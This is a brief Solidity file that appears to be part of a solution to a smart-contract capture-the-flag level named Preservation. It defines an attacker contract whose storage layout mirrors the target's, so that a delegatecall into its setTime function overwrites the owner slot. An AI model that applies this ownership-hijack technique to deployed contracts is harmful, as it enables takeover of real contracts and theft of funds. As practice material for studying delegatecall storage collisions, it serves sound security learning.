// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns (address);
}
contract Cracked16_Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    uint256 public owner;

    constructor() {}

    function setTime(uint256 _timeStamp) public {
        owner = _timeStamp;
    }
}
